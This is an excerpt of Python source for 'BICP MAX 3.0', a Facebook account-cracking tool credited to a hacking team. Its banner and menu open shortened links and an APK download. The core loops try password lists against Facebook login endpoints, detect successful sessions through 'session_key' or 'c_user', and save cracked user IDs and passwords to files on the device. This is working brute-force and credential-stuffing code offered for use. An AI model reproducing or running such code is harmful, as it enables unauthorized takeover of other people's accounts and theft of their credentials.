...
oooooooooo.  ooooo   .oooooo.   ooooooooo.        
`888'   `Y8b `888'  d8P'  `Y8b  `888   `Y88.      
 888     888  888  888           888   .d88'      
 888oooo888'  888  888           888ooo88P'       MAX 
 888    `88b  888  888           888              
 888    .88P  888   88b    ooo   888      
o888bood8P'  o888o  `Y8bood8P'  o888o             
...
----------------------------------------------
 Author     : BELET alamin
 Github     : BELET71
 Facebook   : MOHAMMAD almin
 Tool Name  : BICP MAX
 Team name  : BANGLADESH ISLAMIC CYBER 71
 Version    : 3.0
----------------------------------------------
 BICP MAX VERSION 3.0
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://t.ly/Ecacn/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/BELET_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/100065335384166/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801731787002&text="
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in BELET:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [alamin-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/alamin-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [alamin-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/alamin-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/alamin-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [BELET-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/alamin-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [BELET-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/alamin-OK.txt','a').write(uid+'|'+pas+'\a')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
